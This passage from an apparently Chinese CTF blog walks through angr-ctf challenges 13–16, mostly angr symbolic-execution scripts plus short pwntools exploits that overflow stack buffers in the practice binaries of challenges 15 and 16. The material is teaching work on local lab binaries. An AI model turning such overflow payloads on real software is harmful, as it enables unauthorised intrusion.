class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./13_angr_static_binary&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br><br>    <span class="hljs-comment"># hook the functions</span><br>    proj.hook(<span class="hljs-number">0x8051330</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;scanf&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x80512E0</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;printf&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x805EC90</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;puts&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x806D530</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;strcmp&#x27;</span>]())<br>    proj.hook_symbol(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>, <br>                     angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;glibc&#x27;</span>][<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]())<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>这一次解题大概需要半分钟左右</p><p><img src="https://s2.loli.net/2022/11/04/r6W9EHzQy8lGwXe.png" alt="image.png"></p><p>以及笔者遇到以下几个<strong>不解</strong>的点：</p><ul><li>在出题人留下的 <code>scaffold13.py</code> 中提示我们应当将初始状态设为 main 起始，但笔者这么做无法解出题目（会直接把笔者的阿里云学生机内存撑爆，但这是不应该发生的）</li><li>在 <code>explore()</code> 中将 find 与 avoid 设为检测 stdout 中字符串的方式会比直接引用基本块地址要快 5s</li><li>使用 <code>veritesting=True</code> 会大幅延长解题时间（看起来不会像在笔者有生之年解出的样子）</li><li>使用直接 hook 函数的方式可以解出题，但使用 hook <code>main()</code> 中 call 指令的方式<strong>无法找到解</strong></li><li>总的解题时间比笔者预想中要长得多</li></ul><h2 id="14-angr-shared-library：动态库的符号执行">14_angr_shared_library：动态库的符号执行</h2><blockquote><p>这一题的生成脚本有点问题，直接使用会报 <code>No such file or directory </code>的 gcc error， 这是因为在生成脚本中的 <code>generate()</code> 函数最后一行的 gcc 命令中的 <code>-L</code> 参数未指定目录，在后面加一个 <code>.</code> 指定为当前目录即可</p></blockquote><p>惯例拖入 IDA，这一次在读取输入后调用了自定义的一个动态链接的 <code>validate()</code> 函数对输入进行验证，其定义在自定义库 <code>lib14_angr_shared_library.so</code> 当中</p><p><img src="https://s2.loli.net/2022/11/04/bZiq9ks4Klyf8Gz.png" alt="image.png"></p><p>那么这题直接暴力 explore 求解是可以的，但是这不是我们做题的目的：）</p><p>这题实际上的目的是让我们对动态链接库进行符号执行求解，我们可以直接将初始状态设为 <code>validate()</code>，将结束设为函数返回，并添加对返回值的约束后进行求解即可</p><p>我们现在来逆一下这个动态链接库，其中就只是比较简单的一个 complex 处理的过程而已</p><p><img src="https://s2.loli.net/2022/11/04/oQyUL8W6hb2f9zl.png" alt="image.png"></p><p>那么我们只需要模拟调用 <code>validate()</code> 的过程即可，我们先用 <code>claripy.BVS()</code> 创建一个表示要求解的字符串的符号向量，将其载入到初始状态内存中的一个地址上，之后将这块内存的地址推到栈上作为 <code>validate()</code> 的参数即可</p><p>最后就是直接 <code>explore()</code> 到函数返回后添加 <code>eax == 1</code> 的约束后求解即可，需要注意的是由于这是一个动态链接库，因此我们需要在创建 project 时通过指定加载参数 <code>load_options</code> 来<strong>手动指定加载基地址</strong>，具体写法参照笔者的 exp</p><p>因此最终的解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./lib14_angr_shared_library.so&#x27;</span><br>    base_addr = <span class="hljs-number">0x400000</span><br>    proj = angr.Project(bin_path, load_options = &#123;<br>        <span class="hljs-string">&#x27;main_opts&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;custom_base_addr&#x27;</span>: base_addr<br>        &#125;<br>    &#125;)<br>    start_addr = base_addr + <span class="hljs-number">0x129C</span> <span class="hljs-comment"># addr of validate()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-number">8</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 8 bytes</span><br>    password_addr = <span class="hljs-number">0x3000000</span><br>    init_state.memory.store(password_addr, password)<br><br>    <span class="hljs-comment"># emulate the process of calling validate(password, 8)</span><br>    init_state.regs.ebp = init_state.regs.esp<br>    init_state.stack_push(<span class="hljs-number">8</span>)<br>    init_state.stack_push(password_addr)<br>    init_state.stack_push(<span class="hljs-number">0xdeadbeef</span>)<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = base_addr + <span class="hljs-number">0x134B</span>)<br><br>    solution_state = simgr.found[<span class="hljs-number">0</span>]<br>    solution_state.add_constraints(solution_state.regs.eax == <span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(solution_state.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是差不多秒解：</p><p><img src="https://s2.loli.net/2022/11/05/vQi5PtLqbOVWrxa.png" alt="image.png"></p><p>当然，笔者这里调用函数的方法比较粗犷，也可以使用 angr 提供的 <code>project.factory.call_state(func_addr, args...)</code> 来创建一个函数调用的初始状态，用例写法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><br>bin_path = <span class="hljs-string">&#x27;./test&#x27;</span><br>proj = angr.Project(bin_path)<br><br>func_addr = <span class="hljs-number">0xdeadbeef</span><br>init_state = proj.factory.call_state(func_addr, <span class="hljs-number">114514</span>, <span class="hljs-number">1919810</span>) <span class="hljs-comment"># func(114514, 1919810)</span><br></code></pre></td></tr></table></figure><h1>0x07. angr-ctf：漏洞利用</h1><h2 id="15-angr-arbitrary-read：栈溢出变量覆盖">15_angr_arbitrary_read：栈溢出变量覆盖</h2><p>惯例拖入 IDA，逻辑比较简单，如果第一个数不是 42698355 或者第一个数是 9507730 就输出 <code>&quot;Try again.&quot;</code> ，否则输出 s 字符串，而在读入到 v4 时存在一个栈溢出可以覆盖 s 指针，因此我们可以让其输出指定地址上的字符串</p><p><img src="https://s2.loli.net/2022/11/05/Xm2yczB6WNTa1ex.png" alt="image.png"></p><p>而众所周知 angr-ctf 当中的题目都要我们输出 <code>&quot;Good Job.&quot;</code> 字符串，我们在 IDA 中可以很容易找到他的地址，所以最后的 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p = process(<span class="hljs-string">&#x27;./15_angr_arbitrary_read&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;42698355 &#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span> + p32(<span class="hljs-number">0x58465157</span>))<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>运行即可获得 <code>&quot;Good Job.&quot;</code></p><p><img src="https://s2.loli.net/2022/11/05/p3gPi9TYl1fuU6h.png" alt="image.png"></p><p>——但这并不是我们做这一道题的目的，我们应当使用 angr 来求解：）</p><p>那么用 angr 该怎么做呢？一开始笔者也没太想明白，后面想到既然输入的长度是已知的，那么我们可以使用 SimProcedure 来 hook 掉 scanf，将输入作为符号位向量进行求解，同时我们应当为第二个输入字符串中的每个字符添加成可见字符的约束</p><p>那么这里我们可以使用 <code>BVS.chop(bits=n)</code> 来将符号位向量按照一定尺寸进行分割，于是最后的模拟 scanf 写法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MySimScanfProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, <span class="hljs-built_in">str</span>, key_addr, chr_arr_addr</span>):<br>        key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>        chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>            self.state.add_constraints(ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, ch &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>        self.state.memory.store(key_addr, key_bvs,<br>                                endness = proj.arch.memory_endness)<br>        self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>] = key_bvs<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>] = chr_arr_bvs<br><br>proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MySimScanfProcedure())<br></code></pre></td></tr></table></figure><p>接下来我们需要判断我们的符号化向量是否获得了我们预期中的结果，我们这一次将路径探索的终结点放在 <code>puts()</code>，并判断其参数是否为 <code>&quot;Good Job.&quot;</code> 字符串的地址：</p><ul><li>使用 <code>state.memory.load()</code> 将 <code>puts()</code> 的参数提取出来</li><li>使用 <code>state.solver.symbolic()</code> 判断 <code>puts()</code> 的参数是否是我们的 BVS</li><li>使用 <code>state.copy()</code> 获取当前状态的副本，之后在该副本上添加约束以避免影响到原状态</li><li>使用 <code>state.satisfiable()</code> 判断是否满足约束，若是则添加到原状态中求解即可</li></ul><p>方便起见，这里笔者将搜索的地址设为 <code>puts()</code> 函数的 plt 表地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>    call_puts_addr = <span class="hljs-number">0x8049090</span><br>    <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    good_str_addr = <span class="hljs-number">0x58465157</span><br>    puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                   endness = proj.arch.memory_endness)<br>    <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>        copy_state = state.copy()<br>        copy_state.add_constraints(puts_param == good_str_addr)<br>        <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>            state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>simgr.explore(find = is_success)<br></code></pre></td></tr></table></figure><p>除了通过复制状态后添加约束并判断的方法以外，我们也可以通过为 <code>state.satisfiable()</code> 指定 <code>extra_constraints</code> 参数的方式来在不影响状态本身已有约束集的状态下进行约束判断，因此上面的 is_success() 函数也可以写成如下形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>    call_puts_addr = <span class="hljs-number">0x8049090</span><br>    <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    good_str_addr = <span class="hljs-number">0x58465157</span><br>    puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                   endness = proj.arch.memory_endness)<br>    <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>        <span class="hljs-keyword">if</span> state.satisfiable(extra_constraints=(puts_param == good_str_addr,)):<br>            state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>simgr.explore(find = is_success)<br></code></pre></td></tr></table></figure><p>将上面的进行整合就是我们最后的 exp 了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./15_angr_arbitrary_read&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, <span class="hljs-built_in">str</span>, key_addr, chr_arr_addr</span>):<br>            key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>            chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, ch &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(key_addr, key_bvs,<br>                                    endness = proj.arch.memory_endness)<br>            self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>] = key_bvs<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>] = chr_arr_bvs<br><br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MySimScanfProcedure())<br><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>        call_puts_addr = <span class="hljs-number">0x8049090</span><br>        <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        good_str_addr = <span class="hljs-number">0x58465157</span><br>        puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                       endness = proj.arch.memory_endness)<br>        <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>            copy_state = state.copy()<br>            copy_state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>                state.add_constraints(puts_param == good_str_addr)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    simgr.explore(find = is_success)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>])<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>],<br>                                                cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_0))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_1))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>运行即可成功输出 <code>&quot;Good Job.&quot;</code>：</p><p><img src="https://s2.loli.net/2022/11/30/oL6Nn2hpgq5PmHz.png" alt="image.png"></p><h2 id="16-angr-arbitrary-write：栈溢出变量覆盖">16_angr_arbitrary_write：栈溢出变量覆盖</h2><p>还是惯例地拖入 IDA，本题逻辑主要是读入输入后判断 key 是否是 <code>10225924</code>，若是则拷贝字符串 <code>s</code> 到 <code>dest</code> 所指字符串，否则拷贝到 <code>unimporttant_buffer</code>，最后判断 <code>password_buffer</code> 是否为 <code>&quot;UEQFKBEC&quot;</code>，若是则输出 <code>&quot;Good Job.&quot;</code> 字符串：</p><p><img src="https://s2.loli.net/2022/11/30/FHCbNrcSz8YliIU.png" alt="image.png"></p><p>和上一题类似，本题的输入读入同样存在一个溢出，可以让我们覆盖到 <code>dest</code> ，我们不难想到的是若是将 <code>dest</code> 覆盖为 <code>password_buffer</code> 的地址，便能直接覆写其中的内容</p><p>于是最后的 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./16_angr_arbitrary_write&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;10225924 &quot;</span> + <span class="hljs-string">b&quot;UEQFKBEC&quot;</span> + <span class="hljs-string">b&quot;arttnba3&quot;</span> + p32(<span class="hljs-number">0x58465148</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure><p>运行即可获得 <code>&quot;Good Job.&quot;</code></p><p><img src="https://s2.loli.net/2022/12/02/RjGDpmMz5go3QrN.png" alt="image.png"></p><p>——但这并不是我们做这一道题的目的，我们应当使用 angr 来求解：）</p><p>那么用 angr 该怎么做呢？这题其实和上一道题本质上是一样的，我们同样可以通过 hook scanf 的方式来将我们的输入符号化，之后在 <code>explore()</code> 中设置一个在 <code>strncpy()</code> 上进行判断的函数——判断其第一个参数是否为 <code>password_buffer</code>、第二个参数是否为 <code>&quot;UEQFKBEC&quot;</code> 即可</p><p>最终的解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&quot;./16_angr_arbitrary_write&quot;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-comment"># hook the scanf to symbolize our input</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmtstr, key_addr, chr_arr_addr</span>):<br>            key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key_bvs&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>            chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr_bvs&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> <span class="hljs-built_in">chr</span> <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(<span class="hljs-built_in">chr</span> &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-built_in">chr</span> &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(key_addr, key_bvs, <br>                                    endness = proj.arch.memory_endness)<br>            self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;key_val&#x27;</span>] = key_bvs<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;chr_arr_val&#x27;</span>] = chr_arr_bvs<br>            <br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, SimScanfProcedure())<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>        strncpy_plt = <span class="hljs-number">0x80490F0</span><br>        <span class="hljs-keyword">if</span> state.addr != strncpy_plt:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        strncpy_param1 = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <br>                                           endness = proj.arch.memory_endness)<br>        strncpy_param2 = state.memory.load(state.regs.esp + <span class="hljs-number">8</span>, <span class="hljs-number">4</span>,<br>                                          endness = proj.arch.memory_endness)<br>        first_8_chr = state.memory.load(strncpy_param2, <span class="hljs-number">8</span>)<br>        password_buffer_addr = <span class="hljs-number">0x58465148</span><br><br>        <span class="hljs-keyword">if</span> state.solver.symbolic(strncpy_param1) <span class="hljs-keyword">and</span> state.solver.symbolic(first_8_chr):<br>            copy_state = state.copy()<br>            copy_state.add_constraints(strncpy_param1 == password_buffer_addr)<br>            copy_state.add_constraints(first_8_chr == <span class="hljs-string">b&#x27;UEQFKBEC&#x27;</span>)<br>            <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>                state.add_constraints(strncpy_param1 == password_buffer_addr)<br>                state.add_constraints(first_8_chr == <span class="hljs-string">b&#x27;UEQFKBEC&#x27;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = is_success)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        key_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;key_val&#x27;</span>])<br>        chr_arr_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;chr_arr_val&#x27;</span>],<br>                                                cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: 